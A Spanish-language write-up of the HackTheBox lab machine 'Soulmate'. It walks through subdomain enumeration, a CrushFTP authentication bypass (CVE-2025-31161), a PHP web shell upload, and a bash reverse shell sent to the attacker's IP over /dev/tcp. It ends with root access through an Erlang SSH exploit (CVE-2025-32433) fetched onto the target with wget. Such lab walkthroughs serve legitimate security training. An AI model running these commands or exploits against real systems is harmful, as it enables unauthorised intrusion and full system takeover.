---
title: "Soulmate"
date: 2026-02-15 13:00:00 +0100
categories: [writeups]
tags: [HTB, FTP, SSH, Privesc, Linux]
image:
  path: /assets/img/soulmate.jpeg
  alt: "Miniatura del post"
  w: 1200     # Ancho real de la imagen en px (recomendado)
  h: 630      # Alto real (ratio típico 1.91:1) — recomendado por Chirpy
---

# Soulmate

Soulmate es una máquina Linux de la plataforma HTB, de dificultad easy. Los puntos clave para la resolución de este reto, los vemos a continuación.  

| Contenido |
|-----------|
|-Subdomain Enumeration |
|-CrushFTP (11.w.657) (CVE-2025-31161)- Authentication bypass |
|-Edited Admin Account to allow uploads - PHP malicious File |
|-Privilege Escalation - SSH-2.0-Erlang/5.2.9 - (CVE-2025-32433) |


Empezamos comprobando la conectividad con la máquina objetivo. Para ello, lanzamos un ping y vamos a analizar la respuesta. 

```bash
ping -c 1 IP_Objetivo
```

![Captura de pantalla 1](/assets/img/soulmate/4.jpg)

Hemos enviado un paquete y como vemos, recibimos un paquete de vuelta. Esto indica que la máquina está activa. Importante fijarnos también en el valor del TTL, ya que normalmente puede darnos información sobre el objetivo. En máquinas Linux, este valor suele ser de 64 o cercano a él; mientras que en máquinas Windows este valor es de 128 o cercano. Es cierto que puede ser modificado, pero en este tipo de retos no suele hacerse, por lo tanto, podemos empezar a pensar ya que vamos a tener enfrente un objetivo Linux. 

Ahora la idea es ver qué puertos tiene abiertos. Para ello, utilizamos nmap.


```bash
sudo nmap -p- --open -sS -vvv -n -Pn [IPObjetivo] -oG allPorts
sudo nmap -sC -sV -p[Puertos] [IPObjetivo] -oN targeted
```

![Captura de pantalla 2](/assets/img/soulmate/6.jpg)

Con esta información, lo primero que nos tendría que llamar la atención es que se está aplicando Virtual Hosting en el servidor web que corre en el puerto 80. Nos está redirigiendo a la siguiente ruta 

```
http://soulmate.htb
```

Nuestro equipo no sabe resolver hasta este dominio, por lo tanto si probamos a ver el sitio web ahora simplemente con la IP, no veremos nada. Para solucionar esto, añadimos el nombre de dominio y la IP a nuestro archivo /etc/hosts

```bash
echo -e '10.129.6.222\tsoulmate.htb' | sudo tee -a /etc/hosts
```

Si ahora vamos al navegador y ponemos la IP y el nombre de dominio, nos debería cargar sin problemas. Además vemos, que ambos, cargan el mismo sitio. Es bueno comprobarlo. 

Antes de continuar examinando el sitio web, vamos a emplear whatweb para enumerar un poco las tecnologías que podremos encontrar trabajando por detrás. También podemos verlo empleando Wappalyzer desde el propio navegador si tenemos instalada esta extensión. 

```bash
whatweb http://[IPObjetivo]:80]
```

![Captura de pantalla 3](/assets/img/soulmate/8.jpg)

Ahora ya si, vamos al navegador a ver qué podemos encontrar de utilidad. Vemos lo que parece ser un sitio de citas en línea o algo similar. Si continuamos enumerando cosas, veremos un panel de inicio de sesión y un panel para crear una nueva cuenta. Sin credenciales de acceso, lo suyo es crear una cuenta y ver que funcionalidades tenemos. 

![Captura de pantalla 4](/assets/img/soulmate/9.jpg)

Al iniciar sesión con nuestra cuenta, nos fijamos que podemos subir o cargar una foto de perfil. Podemos probar a subir una imagen al servidor. La imagen se sube correctamente. Si probamos a subir un archivo PHP en lugar de una imagen, ya vamos a darnos cuenta de primeras que el propio sistema de carga de archivos nos solicita archivos de imagen. Aún así, tratamos de meterle un archivo PHP y en principio se sube bien o eso parece; pero al tratar de localizarlo en el servidor, no lo conseguimos. Los archivos se suben al siguiente directorio, pero con un nombre y una serie de números imposibles de localizar haciendo Fuzzing. 

```
http://soulmate.htb/assets/images/profiles/
```

En este punto, cambiamos un poco el enfoque, y vamos a enumerar subdominios. Recordar que podemos emplear varias herramientas. Mis favoritas en estos casos son gobuster y wfuzz. Aunque también se puede utiliza ffuf por ejemplo. 

```bash
gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb --append-domain -o submains.txt
```

```bash
wfuzz -c --hc=404 --hh=154 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.soulmate.htb" http://soulmate.htb
```

```bash
ffuf -u 'http://soulmate.htb' -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.soulmate.htb" -t 100 -fs 154 
```

![Captura de pantalla 5](/assets/img/soulmate/10.jpg)

Como vemos, nos encuentra un subdominio, que vamos a añadir igualmente a nuestro /etc/hosts para poder llegar a él y enumerarlo bien 

```bash
echo -e '10.129.6.222\tftp.soulmate.htb' | sudo tee -a /etc/hosts
```

Ahora vamos a verlo desde el navegador 

```
http://ftp.soulmate.htb
```

![Captura de pantalla 6](/assets/img/soulmate/14.jpg)

Vemos algo llamado "CrushFTP". Si investigamos un poco, descubriremos que CrushFTP es un servidor de transferencia de archivos (FTP/SFTP/HTTP/HTTPS/FTPS) comercial y multiplataforma que se utiliza para intercambiar archivos de manera segura y eficiente. Se diferencia de un FTP tradicional porque incluye muchas funcionalidades avanzadas de gestión, seguridad y administración web.

Buscando vulnerabilidades asociadas a CrushFTP por Internet, damos con CVE-2025-31161. Se trata de una vulnerabilidad crítica de tipo authentication bypass (omisión de autenticación) en CrushFTP. Permite que un atacante sin autenticar envíe peticiones HTTP(S) especialmente manipuladas y logre autenticarse como un usuario existente, típicamente la cuenta administrativa por defecto. Así, el atacante puede conseguir acceso administrativo total a CrushFTP: leer/subir archivos, crear cuentas, ejecutar acciones arbitrarias, comprometer el sistema entero. Siguiendo la PoC vamos a probar a ver si podemos crear un nuevo usuario y autenticarnos ganando acceso al sistema de administración

```
https://github.com/Immersive-Labs-Sec/CVE-2025-31161
```

![Captura de pantalla 7](/assets/img/soulmate/15.jpg)

```bash
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user ryo --password 1234
```

![Captura de pantalla 8](/assets/img/soulmate/16.jpg)

El script se ejecuta correctamente y parece que hemos conseguido crear un nuevo usuario con permisos de administrador. Vamos a ver si es cierto

![Captura de pantalla 9](/assets/img/soulmate/17.jpg)

Efectivamente ganamos acceso con la cuenta de usuario creada al panel de admin de CrushFTP. Ahora seguimos documentándonos para ver qué podemos hacer para ganar acceso al sistema. Si vamos a "User Manager", seleccionamos un usuario admin (por ejemplo ryo) vamos a ver lo siguiente. Desde este panel, podemos añadir rutas reales del sistema al VFS del usuario, dar permisos (Subida de archivos que es lo que nos interesa), en general, hacer que cualquier lugar del sistema sea accesible como "carpeta compartida"

![Captura de pantalla 10](/assets/img/soulmate/18.jpg)

Ahora le damos a "Save" para guardar los cambios y vamos a añadir un archivo PHP malicioso que nos permita ejecutar comandos.

![Captura de pantalla 11](/assets/img/soulmate/19.jpg)

Ahora vamos a "Files" , seleccionamos /app/webProd/ y vamos a cargar nuestro cmd.php malicioso

![Captura de pantalla 12](/assets/img/soulmate/20.jpg)

Una vez subido, si llamamos al recurso desde el navegador, haciendo uso del parámetro cmd y colándole una instrucción, veremos que efectivamente tenemos ejecución remota de comandos

```
http://soulmate.htb/cmd.php?cmd=whoami
```

![Captura de pantalla 13](/assets/img/soulmate/21.jpg)

Estamos ejecutando comandos como el usuario www-data. Si le echamos un vistazo al /etc/passwd veremos que hay dos usuarios (root y ben). Sabiendo esto y que HTB siempre tiene la flag de user.txt en el mismo lugar, podemos ver la Flag de la siguiente manera

![Captura de pantalla 14](/assets/img/soulmate/22.jpg)

```
http://soulmate.htb/cmd.php?cmd=cat /home/ben/user.txt
```

No se nos va a mostrar nada, porque somos www-data y seguramente tendremos que elevar nuestros privilegios a ben para poder visualizarla. Lo que si que vamos a hacer, es ya ganar acceso al sistema de la siguiente forma. Nos ponemos en escucha por netcat por el puerto que queramos, y vamos a enviarnos una Bash a nuestro equipo de atacantes. En Pentesting se suele utilizar el puerto 443 ya que parece tráfico HTTPS normal, evitando restricciones de salida, pasando firewalls con mayor facilidad o levantando menos sospechas. 

```bash
nc -nlvp 443
```

```
http://soulmate.htb/cmd.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.176/443 0>&1'
```

Recordar antes de mandar el comando, URL encodearlo para que se ejecute correctamente. En este caso simplemente convirtiendo & en %26, nos servirá. 

```
http://soulmate.htb/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.176/443 0>%261'
```

![Captura de pantalla 15](/assets/img/soulmate/23.jpg)

Como siempre que ganamos acceso a un sistema, vamos a hacer un pequeño tratamiento de la TTY 

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
# Para hacer CTRL + C
export TERM=xterm
# Para hacer CTRL + L 
stty rows 44 columns 183
# Para arreglar las proporciones
```

Como intuíamos, nos tenemos permisos para acceder al directorio personal del usuario /ben y poder ver la flag de user.txt, tenemos que elevar nuestros privilegios. Tras probar varias formas de hacerlo, vemos algo curioso al listar los puertos en escucha con ss

```bash
ss -tuln
```

![Captura de pantalla 16](/assets/img/soulmate/24.jpg)

Vemos varios puertos en escucha en el LocalHost (127.0.0.1). Vamos a investigar esto más detenidamente. Si nos fijamos en el puerto 2222, y con Netcat (aprovechando que está instalado en la máquina objetivo), tratamos de conectarnos, veremos en el Banner lo siguiente

```bash
nc 127.0.0.1 2222
```

![Captura de pantalla 17](/assets/img/soulmate/25.jpg)

Vemos "SSH-2.0-Erlang/5.2.9". Investigando un poco esto, descubrimos lo siguiente. Este Banner que nos da Netcat, nos está diciendo que el servidor SSH que corre internamente en el puerto 2222 está implementado usando Erlang 5.2.9 (No es OpenSSH ni Dropbear). Erlang es un lenguaje de programación funcional diseñado para sistemas concurrentes, distribuidos y tolerantes a fallos. Si buscamos vulnerabilidades asociadas a esto, descubrimos el siguiente repositorio de GitHub

```
https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
```

CVE-2025-32433 es una vulnerabilidad de seguridad descubierta en Erlang/OTP, concretamente en la implementación del servidor SSH escrita en Erlang. Permite a un atacante RCE (Remote Code Exejecution). Podemos probar si tal.

Vamos a descargarnos clonarnos el repositorio a nuestro equipo de atacantes y pasarlo al equipo objetivo para poder ejecutarlo

```bash
git clone https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC.git
```

Nos metemos en el directorio y nos montamos un servidor web con Python por el puerto 80

```bash
python3 -m http.server 80
```

Ahora en el equipo objetivo, nos movemos al directorio /tmp y vamos a descargarlo y le damos permisos de ejecución

```bash
wget http://10.10.14.176/cve-2025-32433.py
chmod +x cve-2025-32433.py
```

Ahora vamos a ejecutarlo para comprobar si es vulnerable 

```bash
python3 cve-2025-32433.py --help
python3 cve-2025-32433.py 127.0.0.1 -p 2222 --check 
```

![Captura de pantalla 18](/assets/img/soulmate/26.jpg)

Lo bueno de este exploit, es que podemos directamente mandar una Reverse Shell y ganar acceso al sistema con netcat

```bash
nc -nlvp 443
```

```bash
python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.10.14.176 --lport 443
```

![Captura de pantalla 19](/assets/img/soulmate/27.jpg)

Como vemos, nos conectamos al puerto 2222 SSH que corre internamente, en este caso como el usuario root y ahora ya sí, podemos localizar y hacerle un cat a las flags. 

